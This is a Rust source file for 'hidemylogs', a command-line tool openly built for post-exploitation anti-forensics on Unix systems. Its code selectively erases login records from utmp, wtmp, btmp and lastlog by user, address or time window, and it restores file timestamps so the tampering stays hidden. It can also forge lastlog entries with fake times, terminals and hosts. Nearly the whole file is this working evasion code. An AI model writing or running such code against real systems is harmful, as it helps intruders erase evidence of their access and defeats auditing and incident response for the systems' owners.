//! hidemylogs - Surgical *nix log cleaner.
//!
//! Selectively erase access records from lastlog, wtmp, btmp, and utmp
//! while preserving file metadata. Built for post-exploitation OPSEC.
//!
//! Author: Franck FERMAN
//! License: AGPL-3.0

mod utmp;
mod lastlog;
mod display;

use clap::{Parser, Subcommand};
use colored::Colorize;
use std::process;

#[derive(Parser)]
#[command(name = "hidemylogs")]
#[command(about = "Surgical *nix log cleaner - erase access records while preserving file metadata")]
#[command(version)]
struct Cli {
    /// Suppress banner output
    #[arg(short, long, global = true)]
    quiet: bool,

    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Print records from specified log files
    Print {
        /// Path to utmp file
        #[arg(short, long, default_value = "/var/run/utmp")]
        utmp: String,

        /// Path to wtmp file
        #[arg(short, long, default_value = "/var/log/wtmp")]
        wtmp: String,

        /// Path to btmp file
        #[arg(short, long, default_value = "/var/log/btmp")]
        btmp: String,

        /// Path to lastlog file
        #[arg(short, long, default_value = "/var/log/lastlog")]
        lastlog: String,

        /// Which sources to display: u (utmp), w (wtmp), b (btmp), l (lastlog), or any combination
        #[arg(short, long, default_value = "uwbl")]
        sources: String,
    },

    /// Wipe records matching the specified filters
    Wipe {
        /// Path to utmp file
        #[arg(short, long, default_value = "/var/run/utmp")]
        utmp: String,

        /// Path to wtmp file
        #[arg(short, long, default_value = "/var/log/wtmp")]
        wtmp: String,

        /// Path to btmp file
        #[arg(short, long, default_value = "/var/log/btmp")]
        btmp: String,

        /// Path to lastlog file
        #[arg(short, long, default_value = "/var/log/lastlog")]
        lastlog: String,

        /// Which sources to wipe: u (utmp), w (wtmp), b (btmp), l (lastlog)
        #[arg(short, long, default_value = "uwbl")]
        sources: String,

        /// Filter by username
        #[arg(short, long)]
        name: Option<String>,

        /// Filter by IP address or hostname
        #[arg(short, long)]
        address: Option<String>,

        /// Filter by time range (HH:MM-HH:MM, e.g. 03:00-04:00)
        #[arg(short, long)]
        time: Option<String>,

        /// Require ALL filters to match (default: any filter matches)
        #[arg(long)]
        and: bool,

        /// Dry run - show what would be wiped without modifying files
        #[arg(long)]
        dry_run: bool,
    },

    /// Forge a lastlog record with a fake timestamp
    Forge {
        /// Path to lastlog file
        #[arg(short, long, default_value = "/var/log/lastlog")]
        lastlog: String,

        /// Target UID
        #[arg(long)]
        uid: u32,

        /// Fake timestamp (YYYY-MM-DD HH:MM:SS)
        #[arg(short, long)]
        time: String,

        /// Fake terminal
        #[arg(long, default_value = "pts/0")]
        line: String,

        /// Fake hostname/IP
        #[arg(long, default_value = "")]
        host: String,

        /// Dry run
        #[arg(long)]
        dry_run: bool,
    },
}

fn parse_time_range(s: &str) -> Option<(u32, u32)> {
    let parts: Vec<&str> = s.split('-').collect();
    if parts.len() != 2 { return None; }
    let parse_hm = |hm: &str| -> Option<u32> {
        let p: Vec<&str> = hm.split(':').collect();
        if p.len() != 2 { return None; }
        let h: u32 = p[0].parse().ok()?;
        let m: u32 = p[1].parse().ok()?;
        Some(h * 3600 + m * 60)
    };
    Some((parse_hm(parts[0])?, parse_hm(parts[1])?))
}

fn record_in_time_range(tv_sec: i32, range: (u32, u32)) -> bool {
    let secs_in_day = (tv_sec as u32) % 86400;
    if range.0 <= range.1 {
        secs_in_day >= range.0 && secs_in_day <= range.1
    } else {
        secs_in_day >= range.0 || secs_in_day <= range.1
    }
}

fn preserve_timestamps(path: &str) -> Option<(std::time::SystemTime, std::time::SystemTime)> {
    let meta = std::fs::metadata(path).ok()?;
    Some((meta.accessed().ok()?, meta.modified().ok()?))
}

fn restore_timestamps(path: &str, times: (std::time::SystemTime, std::time::SystemTime)) {
    let _ = filetime::set_file_times(
        path,
        filetime::FileTime::from_system_time(times.0),
        filetime::FileTime::from_system_time(times.1),
    );
}

fn wipe_utmp_source(
    path: &str,
    label: &str,
    name: &Option<String>,
    address: &Option<String>,
    time_range: &Option<(u32, u32)>,
    and_mode: bool,
    dry_run: bool,
) -> usize {
    let records = match utmp::read_records(path) {
        Ok(r) => r,
        Err(e) => {
            eprintln!("{} Cannot read {}: {}", "[!]".red(), path, e);
            return 0;
        }
    };

    let saved_times = preserve_timestamps(path);
    let mut keep = Vec::new();
    let mut wiped = 0;

    for rec in &records {
        let name_match = name.as_ref().map_or(false, |n| rec.matches_user(n));
        let addr_match = address.as_ref().map_or(false, |a| rec.matches_host(a));
        let time_match = time_range.map_or(false, |r| record_in_time_range(rec.tv_sec(), r));

        let active_filters: Vec<bool> = [
            name.as_ref().map(|_| name_match),
            address.as_ref().map(|_| addr_match),
            time_range.map(|_| time_match),
        ].into_iter().flatten().collect();

        let should_wipe = if active_filters.is_empty() {
            false
        } else if and_mode {
            active_filters.iter().all(|&m| m)
        } else {
            active_filters.iter().any(|&m| m)
        };

        if should_wipe {
            if dry_run {
                println!(
                    "  {} Would wipe: {} {} {} {}",
                    "[DRY]".yellow(),
                    rec.user(),
                    rec.line(),
                    rec.host(),
                    rec.timestamp()
                );
            }
            wiped += 1;
        } else {
            keep.push(rec.clone());
        }
    }

    if !dry_run && wiped > 0 {
        if let Err(e) = utmp::write_records(path, &keep) {
            eprintln!("{} Cannot write {}: {}", "[!]".red(), path, e);
            return 0;
        }
        if let Some(times) = saved_times {
            restore_timestamps(path, times);
        }
    }

    display::print_wipe_result(wiped, label);
    wiped
}

fn wipe_lastlog_source(
    path: &str,
    name: &Option<String>,
    dry_run: bool,
) -> usize {
    let records = match lastlog::read_records(path) {
        Ok(r) => r,
        Err(e) => {
            eprintln!("{} Cannot read {}: {}", "[!]".red(), path, e);
            return 0;
        }
    };

    let target_username = match name {
        Some(n) => n.clone(),
        None => {
            println!("{} lastlog requires --name (UID lookup by username)", "[*]".yellow());
            return 0;
        }
    };

    let target_uid = match resolve_uid(&target_username) {
        Some(uid) => uid,
        None => {
            eprintln!("{} Cannot resolve username '{}' to UID", "[!]".red(), target_username);
            return 0;
        }
    };

    let mut wiped = 0;

    for rec in &records {
        if rec.uid == target_uid && !rec.is_empty() {
            if dry_run {
                println!(
                    "  {} Would wipe lastlog for UID {} ({}): {} from {} at {}",
                    "[DRY]".yellow(),
                    rec.uid,
                    target_username,
                    rec.line(),
                    rec.host(),
                    rec.timestamp_str()
                );
            } else {
                let mut wiped_rec = rec.clone();
                wiped_rec.wipe();
                if let Err(e) = lastlog::write_record_at_uid(path, target_uid, &wiped_rec) {
                    eprintln!("{} Cannot write lastlog: {}", "[!]".red(), e);
                    return 0;
                }
            }
            wiped += 1;
        }
    }

    display::print_wipe_result(wiped, "lastlog");
    wiped
}

fn resolve_uid(username: &str) -> Option<u32> {
    let passwd = std::fs::read_to_string("/etc/passwd").ok()?;
    for line in passwd.lines() {
        let fields: Vec<&str> = line.split(':').collect();
        if fields.len() >= 3 && fields[0] == username {
            return fields[2].parse().ok();
        }
    }
    None
}

fn parse_timestamp(s: &str) -> Option<u32> {
    chrono::NaiveDateTime::parse_from_str(s, "%Y-%m-%d %H:%M:%S")
        .ok()
        .map(|dt| dt.and_utc().timestamp() as u32)
}

fn main() {
    let cli = Cli::parse();

    if !cli.quiet {
        display::print_banner();
    }

    match cli.command {
        Commands::Print {
            utmp,
            wtmp,
            btmp,
            lastlog,
            sources,
        } => {
            if sources.contains('u') {
                println!("\n{}", "=== utmp ===".bold());
                match utmp::read_records(&utmp) {
                    Ok(records) => display::print_utmp_records(&records),
                    Err(e) => eprintln!("{} {}: {}", "[!]".red(), utmp, e),
                }
            }
            if sources.contains('w') {
                println!("\n{}", "=== wtmp ===".bold());
                match utmp::read_records(&wtmp) {
                    Ok(records) => display::print_utmp_records(&records),
                    Err(e) => eprintln!("{} {}: {}", "[!]".red(), wtmp, e),
                }
            }
            if sources.contains('b') {
                println!("\n{}", "=== btmp ===".bold());
                match utmp::read_records(&btmp) {
                    Ok(records) => display::print_utmp_records(&records),
                    Err(e) => eprintln!("{} {}: {}", "[!]".red(), btmp, e),
                }
            }
            if sources.contains('l') {
                println!("\n{}", "=== lastlog ===".bold());
                match lastlog::read_records(&lastlog) {
                    Ok(records) => display::print_lastlog_records(&records),
                    Err(e) => eprintln!("{} {}: {}", "[!]".red(), lastlog, e),
                }
            }
        }

        Commands::Wipe {
            utmp,
            wtmp,
            btmp,
            lastlog,
            sources,
            name,
            address,
            time,
            and,
            dry_run,
        } => {
            if name.is_none() && address.is_none() && time.is_none() {
                eprintln!("{} At least one filter required: --name, --address, or --time", "[!]".red());
                process::exit(1);
            }

            let time_range = time.as_ref().and_then(|t| parse_time_range(t));
            if time.is_some() && time_range.is_none() {
                eprintln!("{} Invalid time range format. Use: HH:MM-HH:MM (e.g. 03:00-04:00)", "[!]".red());
                process::exit(1);
            }

            if dry_run {
                println!("{}", "[DRY RUN] No files will be modified.".yellow().bold());
            }

            let mut total = 0;

            if sources.contains('u') {
                total += wipe_utmp_source(&utmp, "utmp", &name, &address, &time_range, and, dry_run);
            }
            if sources.contains('w') {
                total += wipe_utmp_source(&wtmp, "wtmp", &name, &address, &time_range, and, dry_run);
            }
            if sources.contains('b') {
                total += wipe_utmp_source(&btmp, "btmp", &name, &address, &time_range, and, dry_run);
            }
            if sources.contains('l') {
                total += wipe_lastlog_source(&lastlog, &name, dry_run);
            }

            println!(
                "\n{} Total: {} record(s) {}",
                "[*]".bold(),
                total,
                if dry_run { "would be wiped" } else { "wiped" }
            );
        }

        Commands::Forge {
            lastlog,
            uid,
            time,
            line,
            host,
            dry_run,
        } => {
            let timestamp = match parse_timestamp(&time) {
                Some(ts) => ts,
                None => {
                    eprintln!("{} Invalid timestamp format. Use: YYYY-MM-DD HH:MM:SS", "[!]".red());
                    process::exit(1);
                }
            };

            if dry_run {
                println!(
                    "{} Would forge lastlog for UID {}: {} from {} at {}",
                    "[DRY]".yellow(),
                    uid,
                    line,
                    host,
                    time
                );
            } else {
                let mut rec = lastlog::LastlogRecord {
                    uid,
                    raw: [0u8; lastlog::LASTLOG_RECORD_SIZE],
                };
                rec.forge(timestamp, &line, &host);

                match lastlog::write_record_at_uid(&lastlog, uid, &rec) {
                    Ok(_) => println!(
                        "{} Forged lastlog for UID {}: {} from {} at {}",
                        "[+]".green(),
                        uid,
                        line,
                        host,
                        time
                    ),
                    Err(e) => {
                        eprintln!("{} Cannot write lastlog: {}", "[!]".red(), e);
                        process::exit(1);
                    }
                }
            }
        }
    }
}
